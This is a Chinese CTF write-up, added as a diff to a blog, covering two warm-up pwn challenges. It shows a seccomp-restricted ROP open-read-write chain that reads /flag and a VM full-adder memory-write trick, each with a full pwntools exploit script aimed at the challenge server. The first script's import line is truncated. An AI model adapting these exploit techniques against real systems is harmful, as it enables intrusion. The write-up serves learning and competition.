@@ -1,0 +1,287 @@
+export const layout = "#components/Page.js";
+export const title = "京麒CTF 2025 热身赛 WriteUp";
+export const created = "2025-05-15T09:24:03+08:00";
+
+
+# 京麒CTF 2025 热身赛 WriteUp
+
+## SimpleRop
+
+保护：
+
+```
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+
+
+```c
+__int64 init()
+{
+  setvbuf(stdout, 0LL, 2LL, 0LL);
+  setvbuf(stdin, 0LL, 2LL, 0LL);
+  setvbuf(stderr, 0LL, 2LL, 0LL);
+  return close(2LL);
+}
+
+__int64 __fastcall vuln(__int64 a1, __int64 a2)
+{
+  __int64 v2; // rdx
+  __int64 v3; // rcx
+  __int64 v4; // r8
+  __int64 v5; // r9
+  unsigned int v7; // [rsp+0h] [rbp-40h]
+  __int64 v8; // [rsp+8h] [rbp-38h] BYREF
+
+  random_fd();
+  v7 = dup(1LL);
+  close(1LL);
+  random_fd();
+  seccomp_orw_only(1LL, a2, v2, v3, v4, v5);  // sandbox
+  write(v7, "Let me see see your rop skill\n", 0x1EuLL);
+  return read(0LL, &v8, 1024LL);  // stack overflow
+}
+```
+
+
+题目给了几乎无限的栈溢出，但是只能打 orw，且程序 `close` 了 1，2，而且在 `dup` 前后随机申请了若干个 fd，但是 `v7` 作为 `dup` 出来的 fd 并没有 close，所以还是可以打。
+
+有两种写法，第一种是用妙妙 gadget 把 v7 的那个值存下来：
+
+gadget1:
+
+```
+0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;
+```
+
+gadget2:
+
+```
+0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;
+```
+
+选择这个 gadget2 是因为注意到程序在溢出时 rsi 寄存器上存放了 `v7` 的栈地址 + 8。
+
+第二种是用爆破的思路（daimi 师傅的写法）
+
+
+简单来说就是用 `leave; ret` 实现 `jmp` 的效果，从而爆破 fd。
+
+
+```python
+*
+from sys import argv
+
+proc = "./pwn1"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("39.106.16.204", 62123) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    b *0x401afc
+    """)
+
+
+pop_rdi_ret = 0x00000000004021cf
+pop_rsi_ret = 0x000000000040a23e
+pop_rdx_rbx_ret = 0x000000000047fbab
+pop_rax_ret = 0x00000000004487a7
+syscall = 0x0000000000414f46
+main = 0x401AE2
+mov_rdi_rax_ret = 0x0000000000480192
+pop_r12_ret = 0x000000000040262d
+
+# 0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;
+# 0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;
+# 0x000000000046d4d3: mov eax, 1; ret;
+
+pop_rcx_ret = 0x0000000000471183
+magic = 0x0000000000427720
+mov_rdi_r12_call = 0x448c55
+pop_rbx_ret = 0x0000000000401c00
+write = 0x447C20
+mov_rax_r8_ret = 0x44ac44
+mov_eax_1_ret = 0x46d4d3
+
+payload = b"a" * 64
+payload += flat([pop_rdi_ret, 0x4c9608, magic])
+payload += flat([pop_rdi_ret, 0, pop_rsi_ret, 0x4c9000, pop_rdx_rbx_ret, 0x30, 0, pop_rax_ret, 0, syscall])  # read
+payload += flat([pop_rdi_ret, 0x4c9000, pop_rsi_ret, 4, pop_rax_ret, 2, pop_rdx_rbx_ret, 0, 0, syscall])  # open
+payload += flat([mov_rdi_rax_ret, pop_rsi_ret, 0x4c9500, pop_rdx_rbx_ret, 0x50, 0, pop_rax_ret, 0, syscall])  # read
+payload += flat([pop_r12_ret, 0x4c9600, pop_rbx_ret, write, mov_rdi_r12_call])  # write
+
+io.sendline(payload)
+sleep(0.5)
+io.sendline(b"/flag\x00")
+
+
+io.interactive()
+```
+
+
+## EzVM
+
+vm 题，逆向出的 vm 结构如下：
+
+```c
+00000000 struct __attribute__((packed)) __attribute__((aligned(1))) Count // sizeof=0x37
+00000000 {
+00000000     int code_len;
+00000004     Code *code;
+0000000C     char pad[31];
+0000002B     char *reg;
+00000033     int pc;
+00000037 };
+
+00000000 struct Code // sizeof=0x4
+00000000 {
+00000000     char op;
+00000001     char oper1;
+00000002     char flags;
+00000003     char oper2;
+00000004 };
+```
+
+```c
+Count *__fastcall vm(Count *count)
+{
+  int op; // eax
+  bool carry_in; // al
+  Count *result; // rax
+  char oper2; // [rsp+18h] [rbp-18h]
+  char d_; // [rsp+18h] [rbp-18h]
+  bool val; // [rsp+1Ch] [rbp-14h]
+  bool b_; // [rsp+1Ch] [rbp-14h]
+  char v8; // [rsp+24h] [rbp-Ch]
+  Code *cur; // [rsp+28h] [rbp-8h]
+
+  cur = &count->code[count->pc];
+  val = read_val(count, (unsigned __int8)cur->oper1);
+  if ( cur->flags )
+    oper2 = cur->oper2;
+  else
+    oper2 = read_val(count, (unsigned __int8)cur->oper2);
+  b_ = val;
+  d_ = oper2 & 1;
+  op = (unsigned __int8)cur->op;
+  if ( op == 4 )
+  {
+    carry_in = read_val(count, 0);
+    v8 = carry_in ^ d_ ^ b_;
+    write_val(count, 0, b_ & (carry_in | d_) | carry_in & d_);
+    write_val(count, (unsigned __int8)cur->oper1, v8);
+  }
+  else
+  {
+    if ( (unsigned __int8)cur->op > 4u )
+      goto LABEL_14;
+    switch ( op )
+    {
+      case 3:
+        write_val(count, (unsigned __int8)cur->oper1, d_ | b_);
+        break;
+      case 1:
+        write_val(count, (unsigned __int8)cur->oper1, d_ ^ b_);
+        break;
+      case 2:
+        write_val(count, (unsigned __int8)cur->oper1, d_ & b_);
+        break;
+      default:
+LABEL_14:
+        printf("未知操作码: 0x%02x\n", (unsigned __int8)cur->op);
+        exit(1);
+    }
+  }
+  result = count;
+  ++count->pc;
+  return result;
+}
+```
+
+
+重点在这里的操作 4，实现了一个 1 位可进位全加器，通过这个操作 4 可以按字节给某个地址加数。虽然程序原先的功能里，无法写到 `0x4097` 处，但是可以写到结构体指针 `*reg`，于是思路如下：
+
+1. 修改 `*reg` 到 `0x4097`
+2. 写 `0x4097` 为 `$rebase(0x4097) - 0xdeadbeef`，这里可以按字节写。
+
+
+exp:
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./pwn2"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("39.106.16.204", 13242) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    decompiler connect ida --host 127.0.0.1 --port 3662
+    breakrva 0x0173A
+    """)
+
+
+def gen_code(op, val1, flag, val2):
+    return p8(op) + p8(val1) + p8(flag) + p8(val2)
+
+
+def xor(val1, flag, val2):
+    return gen_code(1, val1, flag, val2)
+
+
+def _and(val1, flag, val2):
+    return gen_code(2, val1, flag, val2)
+
+
+def _or(val1, flag, val2):
+    return gen_code(3, val1, flag, val2)
+
+
+def add(val1, flag, val2):
+    return gen_code(4, val1, flag, val2)
+
+
+payload = b""
+payload += _or(0x1f * 8 + 4, 1, 1)
+payload += add(0xf * 8 + 0, 1, 1)
+payload += _or(0xe * 8 + 1, 1, 1)
+
+for i in range(6):
+    for j in range(8):
+        payload += _or((0x18 + i) * 8 + j, 0, (0xc + i) * 8 + j)
+
+src = [0x7f, 0xb0, 0x68, 0x9f, 0xe4]
+target = [0xa8, 0xf1, 0xba, 0xc0, 0xe3 + 0x100]
+
+for i in range(5):
+    payload += _and(0, 1, 0)
+    # for j in range(src[i], target[i]):
+    #     payload += _and(0, 1, 0)
+    #     payload += add((0x18 + i) * 8 + 0, 1, 1)
+    #     for k in range(1, 7):
+    #          payload += add((0x18 + i) * 8 + k, 1, 0)
+    tmp = target[i] - src[i]
+    s = bin(tmp)[2:].rjust(8, "0")[::-1]
+    for j in range(8):
+        if s[j] == "0":
+            payload += add((0x18 + i) * 8 + j, 1, 0)
+        elif s[j] == "1":
+            payload += add((0x18 + i) * 8 + j, 1, 1)
+
+
+io.sendlineafter(b"Code Count:", str(len(payload) // 4).encode())
+io.sendlineafter(b"Code: ", payload)
+
+io.interactive()
+```
